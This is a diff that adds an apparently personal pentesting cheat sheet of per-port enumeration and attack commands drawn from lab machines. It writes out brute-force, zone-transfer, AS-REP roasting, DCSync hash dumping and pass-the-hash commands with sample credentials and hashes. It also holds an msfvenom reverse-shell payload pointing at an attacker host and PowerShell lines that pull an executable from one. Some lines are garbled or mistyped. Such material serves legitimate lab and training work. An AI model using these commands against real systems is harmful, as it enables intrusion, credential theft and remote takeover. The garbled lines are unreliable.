@@ -1,0 +1,446 @@
+
+###  How to Enumerate port 
+
+
+### best website for these enumeration 
+
+https://0xffsec.com/handbook/services/pop/
+
+
+port 21 :: ftp  # ftp 10.129.98.52  21 
+
+    #downlaod file :   get file.tgz  or whole download file mget * 
+
+port 22 ::  ssh pen@10.129.98.52 22 
+
+    #downlaod file:   scp pen@10.129.98.52:/tmp/file  . 
+
+    # hydra -l root -P rockyou.txt  10.129.98.52 ssh 
+
+port 23 ::  telnet  10.129.98.52  23  # this is looks like ssh 
+
+    # vrfy root
+    # vrfy admin, administrator 
+
+port 25 or 465 587 :: smtpwalk -c public v3  10.129.98.52 {id number}
+
+     # show all system information , process , running service , username password 
+
+
+port 79 ::  echo "root" | nc -n 10.0.0.3 79
+
+    # telnet 10.10.10.10 79 
+
+
+port 53 :: Dns Enumeration 
+
+ 
+ # dig axfr @10.10.10.175  EGOTISTICAL-BANK.LOCAL 
+
+ # dig axfr @10.10.10.175  
+
+ #  dig pentestblog.in -t ns
+
+ dig pentestblog.in -t mx 
+
+ dig pentestblog.in 
+
+ dig zonetransfer.me ns 
+
+ dig zonetransfer.me mx 
+
+ dig zonetransfer.me txt # this give us important information about your domain 
+
+
+
+
+
+ Dns enumeration using host command 
+
+ Find IP Address ? 
+
+ # host -A google.com 
+
+ Find Name Server of Domain ? 
+
+ # host -t ns google.com 
+
+ Find Mail Server of Domain ? 
+
+ # host -t mx google.com 
+
+ Find txt infomation 
+
+ # host -t txt google.com 
+
+# After find details zone transfer attack 
+
+ host -l google.com ns1.google.com # get more information 
+
+ host -l  zonetransfer.me nsztm2.digi.ninja 
+
+
+
+port 80 :: http  # this is larget attack surface 
+ 
+      # gobuster , feroxbuster , identify file externtion , check vhost , check bugs 
+
+
+port 110 or 995 ::  pop3 : telnet 10.0.0.3 110 : nc 10.0.0.3 110
+
+	USER    Username or mailbox.
+	PASS    Server/mailbox-specific password.
+	STAT    Number of messages in the mailbox.
+	LIST    [ message# ] Messages summary.
+	RETR    [ message# ] Retrieve selected message.
+	DELE    [ message# ] Delete selected message.
+	RSET    Reset the session. Undelete deleted messages.
+	NOOP    No-op. Keeps connection open.
+	QUIT    End session.
+
+
+port 119 433 563 :: nc 10.0.0.3 119
+
+		CAPABILITIES            List server capabilities.
+		HELP                    Show available commands.
+		MODE READER             Use Reader mode. Reader mode uses a lot of commands, use HELP.
+		LIST                    List groups.
+		SELECT <group>          Select group.
+		LISTGROUP <group>       List article in a group.
+		HEAD <article_id>       Retrieve article header.
+		BODY <article_id>       Retrieve article body.
+		ARTICLE <article_id>    Retrieve article.
+		POST                    Post article.   
+
+port 135 or 593 :: rpc  #  rpcclient -U "" 10.0.0.3 -N # no password ask 
+
+ #  rpcclient 10.10.10.175 -N -U '' -W EGOTISTICAL-BANK.LOCAL
+
+ # keep in mind always check help section 
+		
+
+
+                queryuser	SAMR	Retrieve user information.
+		querygroup	SAMR	Retrieve group information.
+		querydominfo	SAMR	Retrieve domain information.
+		enumdomusers	SAMR	Enumerate domain users.
+		enumdomgroups	SAMR	Enumerate domain groups.
+		createdomuser	SAMR	Create a domain user.
+		deletedomuser	SAMR	Delete a domain user.
+		lookupnames	LSARPC	Look up usernames to SID values.
+		lookupsids	LSARPC	Look up SIDs to usernames (RID cycling).
+		lsaaddacctrights	LSARPC	Add rights to a user account.
+		lsaremoveacctrights	LSARPC	Remove rights from a user account.
+		dsroledominfo	LSARPC-DS	Get primary domain information.
+		dsenumdomtrusts	LSARPC-DS	Enumerate trusted domains within an AD forest
+
+port 137 138 139 :: netbios  137,138 udp and 139 tcp 
+
+   nbtscan 10.0.0.3
+
+
+
+port 139, 445  :: smb use auxiliary/scanner/smb/smb_version # metasploit
+
+    # smbclient whole 
+
+    # check list all share 
+
+     smbclient -L //10.0.0.3
+    
+    # check list all share no auth 
+
+      smbclient -N -L //10.0.0.3
+
+    # check list all share with auth 
+   
+      smbclient -U "username[%passwd]" -L [hash]  //10.0.0.3   
+
+
+   # check list using admin 
+
+    smbclient  -L \\\\10.10.10.175 -U '' -N
+
+      
+    # smbmap  all cheatsheet
+
+    # simple login 
+
+    smbmap -H 10.10.10.134  
+  
+    # authentication login #mens anonymous login  
+
+    smbmap -H 10.10.10.134 -u pentestblog -p hacker12
+     
+    # smbmap with domain login  with authentication 
+  
+    smbmap -H 10.129.98.52  -d dancing -u admin -p hacker12
+
+    # smbmap with hash login  
+ 
+    smbmap -H 10.10.10.134 -u pentestblog -p hash3892438489230482
+  
+    # smbmap with authentication read file through smbmap 
+
+     smbmap -u  pentestblog   -p hacker -H 10.10.10.134 -r backups --depth 5 
+
+   #  smbmap with authentication read all file 
+
+    smbmap -u  pentestblog   -p hacker -H 10.10.10.134 -R backups --depth 5 
+
+   """""""""""""""""""""""""""""""""""""""""""""""""""
+  ┌──(pentestblog__Pentestblog)-[~/_/Windows/Easy/timelapses/smb]
+└─$ smbmap -H 10.10.11.152 -d timelapse.htb -u 'guest' -r Shares --depth 5
+[+] IP: 10.10.11.152:445        Name: timelapse.htb                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Shares                                                  READ ONLY
+        .\Shares\*
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    .
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    ..
+        dr--r--r--                0 Tue Oct 26 01:10:06 2021    Dev
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    HelpDesk
+                                                                                                                                                    
+┌──(pentestblog__Pentestblog)-[~/_/Windows/Easy/timelapses/smb]
+└─$ smbmap -H 10.10.11.152 -d timelapse.htb -u 'guest' -R Shares --depth 5  
+[+] IP: 10.10.11.152:445        Name: timelapse.htb                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        Shares                                                  READ ONLY
+        .\Shares\*
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    .
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    ..
+        dr--r--r--                0 Tue Oct 26 01:10:06 2021    Dev
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    HelpDesk
+        .\Shares\Dev\*
+        dr--r--r--                0 Tue Oct 26 01:10:06 2021    .
+        dr--r--r--                0 Tue Oct 26 01:10:06 2021    ..
+        fr--r--r--             2611 Tue Oct 26 02:35:30 2021    winrm_backup.zip
+        .\Shares\HelpDesk\*
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    .
+        dr--r--r--                0 Mon Oct 25 21:25:14 2021    ..
+        fr--r--r--          1118208 Mon Oct 25 21:25:14 2021    LAPS.x64.msi
+        fr--r--r--           104422 Mon Oct 25 21:25:14 2021    LAPS_Datasheet.docx
+        fr--r--r--           641378 Mon Oct 25 21:25:14 2021    LAPS_OperationsGuide.docx
+        fr--r--r--            72683 Mon Oct 25 21:25:14 2021    LAPS_TechnicalSpecification.docx
+                                                                                                   
+
+
+
+
+
+
+ ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+   # enum4 linux  out of date 
+
+    enum4linux  #enum4linux -a -u "<username>" -p "<passwd>" 10.0.
+
+
+port 143 , 993 :: imap 
+
+  telnet 10.0.0.3 143
+ openssl s_client -connect 10.0.0.3:993
+
+
+
+port 6379 :: redis  redis-cli enumeration 
+
+	#nc -vn 10.10.10.10 6379
+	#redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
+
+
+port 161 snmp enumeration 
+
+┌──(pentestblog__Pentestblog)-[~/_/Boxes/Linux/Easy/Antique]
+└─$ sudo vi /etc/snmp/snmp.conf
+                                                                                                                                                    
+┌──(pentestblog__Pentestblog)-[~/_/Boxes/Linux/Easy/Antique]
+└─$ snmpwalk -c public -v2c 10.10.11.107 
+iso.3.6.1.2.1 = STRING: "HTB Printer"
+                                                                                                                                                    
+┌──(pentestblog__Pentestblog)-[~/_/Boxes/Linux/Easy/Antique]
+└─$ nano /etc/snmp/snmp.conf      
+                                                                                                                                                    
+┌──(pentestblog__Pentestblog)-[~/_/Boxes/Linux/Easy/Antique]
+└─$ sudo nano /etc/snmp/snmp.conf
+                                                                                                                                                    
+┌──(pentestblog__Pentestblog)-[~/_/Boxes/Linux/Easy/Antique]
+└─$ snmpwalk -c public -v2c 10.10.11.107 
+SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
+                                                                                                                                                    
+
+   snmpbulkwalk -c public -v2c 10.10.11.107 .
+
+
+## How to identify pcap file 
+
+ #you can use several tool 
+
+  capainfos <file> 
+ 
+  tcpdump -r <file> 
+
+  according to better is wireshark 
+
+  open pcap file through wireshark 
+
+
+# port 88 Enumration kerberos Active Directory 
+
+  This is authentication protocol. it allow to identity to each user , who provide secret password 
+
+     
+
+    Kerbrute has three main commands:
+
+    bruteuser - Bruteforce a single user's password from a wordlist
+    bruteforce - Read username:password combos from a file or stdin and test them
+    passwordspray - Test a single password against a list of users
+    userenum - Enumerate valid domain usernames via Kerberos
+
+
+    -d < domain > 
+
+    --dc < domain controller > 
+
+ 
+    -t < theread > 
+
+  
+    #./kerbrute userenum --dc 10.10.10.175  -d EGOTISTICAL-BANK.LOCAL user.txt
+
+    # after find username let's file tgt key 
+
+    GetNPUsers.py -dc-ip 10.10.199.28 spookysec.local/ -usersfile use -format john -outputfile love
+
+    GetNPUsers.py -dc-ip 10.10.199.28 spookysec.local/ -usersfile use -format hashcat -outputfile loves  # hashcat 
+
+    hashcat -m 18200 loves passwordlist.txt 
+
+   # DC syn 
+ 
+	   secretsdump.py -just-dc svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 # dump all hashes
+
+ # login administrator through evil-winrm 
+
+           evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+ # login administrator through hash psexec.py 
+
+  psexec.py -hashes "823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e" -dc-ip 10.10.10.175 administrator@10.10.10.175 
+
+ 
+
+      """""""""""""""""""""""""""""""""""""""use metasploit :::::::::::::::::::::::::::::::::::
+
+
+        msf6 auxiliary(gather/kerberos_enumusers) > show options 
+
+Module options (auxiliary/gather/kerberos_enumusers):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   DOMAIN     timelapse.htb    yes       The Domain Eg: demo.local
+   RHOSTS     10.10.11.152     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      88               yes       The target port
+   Timeout    10               yes       The TCP timeout to establish connection and read data
+   USER_FILE  user.txt         yes       Files containing usernames, one per line
+
+      
+
+
+## ldap pentesting {{ 389, 636, 3268, 3269 }} 
+
+ ldap is a software protocol enable anyone to locate org induvisual other resources file and devices in network protocol whether on a public or on a corporate 
+
+  
+ 
+	  
+        dn: dc=local
+	dc: local
+	objectClass: dcObject
+
+	dn: dc=moneycorp,dc=local
+	dc: moneycorp
+	objectClass: dcObject
+	objectClass: organization
+
+	dn ou=it,dc=moneycorp,dc=local
+	objectClass: organizationalUnit
+	ou: dev
+
+	dn: ou=marketing,dc=moneycorp,dc=local
+	objectClass: organizationalUnit
+	Ou: sales
+
+	dn: cn= ,ou= ,dc=moneycorp,dc=local
+	objectClass: personalData
+	cn:
+	sn:
+	gn:
+	uid:
+	ou:
+	mail: pepe@hacktricks.xyz
+	phone: 23627387495
+
+
+
+Lines 1-3 define the top level domain local
+Lines 5-8 define the first level domain moneycorp (moneycorp.local)
+Lines 10-16 define 2 organizational units: dev and sales
+Lines 18-26 create an object of the domain and assign attributes with values
+
+
+
+########  ldapsearch tool 
+
+ldapsearch -H ldap://<ip> -x
+ldapsearch -H ldap://10.10.10.119 -x -s base namingcontexts
+ldapsearch -H ldap://10.10.10.119 -x -b 'dc=lightweight,dc=htb'
+
+
+
+## crackmapexec tool 
+
+ crackmapexec smb 10.10.10.175 # check domain 
+
+ crackmapexec smb  10.10.10.175 --share #check shares 
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' --shares # check share with default credential 
+
+ crackmapexec smb 10.10.10.175  -u 'Administrator' -p 'askfjdska'  --sam {--users} # dump hash list users 
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' --groups # enumerate groups 
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' --spider C\$ --pattern log # enurate log file or txt type enum text file 
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' --sessions # enumrating sessions
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' --pass-pol # password policy 
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' --disks
+
+ crackmapexec smb 10.10.10.175 -u '' -H 'paste hash' # pass the hash attack 
+
+ crackmapexec smb 10.10.10.175 -u '' -p '' -x # command execution 
+
+ crackmapexec winrm  10.10.10.175  -u fsmith -p 'Thestrokes23' # winrm login 
+
+ 
+### Evil-Winrm Login 
+
+ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175  
+
+ for ssl evil-winrm  -S -u fsmith -p Thestrokes23 -i 10.10.10.175  
+
+
+# Create Windows cmd shell.exe 
+
+ msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.10 lport=9001 -f exe -o shell.exe 
+
+
+## Downlaod file through powershell 
+
+Invoke-WebRequest -URI http://10.10.14.3/windows.exe -OutFile C:\Users\Pentestblog\windows.exe
+
+
+(New-Object System.Net.WebClient).DownloadFile (http://10.10.14.3/windows.exe, C:\Users\Pentestblog\windows.exe)
